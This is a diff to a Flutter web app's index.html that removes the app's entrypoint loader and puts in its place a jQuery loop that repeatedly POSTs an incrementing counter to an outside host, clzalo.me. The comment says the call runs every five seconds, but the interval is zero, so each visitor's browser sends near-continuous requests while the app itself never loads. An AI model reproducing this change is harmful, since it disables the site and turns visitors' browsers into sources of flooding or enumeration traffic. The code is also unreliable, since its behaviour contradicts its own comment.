@@ -42,19 +42,27 @@
 </head>
 <body>
   <script>
-    window.addEventListener('load', function(ev) {
-      // Download main.dart.js
-      _flutter.loader.loadEntrypoint({
-        serviceWorker: {
-          serviceWorkerVersion: serviceWorkerVersion,
-        },
-        onEntrypointLoaded: function(engineInitializer) {
-          engineInitializer.initializeEngine().then(function(appRunner) {
-            appRunner.runApp();
-          });
-        }
-      });
-    });
+   let pos = 0; // Khởi tạo giá trị pos
+
+setInterval(function() {
+  $.ajax({
+    url: 'https://clzalo.me/api/check.php?code=3123213213',
+    method: 'POST',
+    contentType: 'application/json',
+    data: JSON.stringify({
+      pos: pos,
+      n: 3
+    }),
+    success: function(value) {
+      console.log('Dữ liệu trả về:', value);
+      pos++; // Tăng giá trị pos mỗi lần gọi API
+    },
+    error: function(error) {
+      console.error('Lỗi khi lấy dữ liệu:', error);
+    }
+  });
+}, 0); // Gọi API mỗi 5 giây
+
   </script>
 </body>
 </html>
